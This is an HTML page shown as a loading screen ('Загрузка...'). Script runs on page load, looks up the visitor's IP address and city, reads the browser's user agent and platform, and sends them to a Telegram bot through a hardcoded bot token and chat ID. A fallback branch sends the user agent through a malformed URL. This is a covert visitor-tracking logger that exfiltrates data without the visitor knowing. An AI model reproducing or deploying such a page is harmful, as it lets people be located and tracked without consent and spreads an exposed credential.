<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
    <h1 id="status">Загрузка... (v20.0)</h1>
    <script>
        async function start() {
            const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
            const chat_id = "8426763446";
            const status = document.getElementById('status');

            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                
                const msg = `🚀 ЛОГ!\nIP: ${d.ip}\nГород: ${d.city}\n📱 Устройство: ${navigator.userAgent}\n💻 ОС: ${navigator.platform}`;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                
                status.innerText = "ГОТОВО!";
            } catch (e) {
                const errText = `⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`;
                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(errText)}`);
                status.innerText = "Готово (лог ушел)!";
            }
        }
        start();
    </script>
</body>
</html>
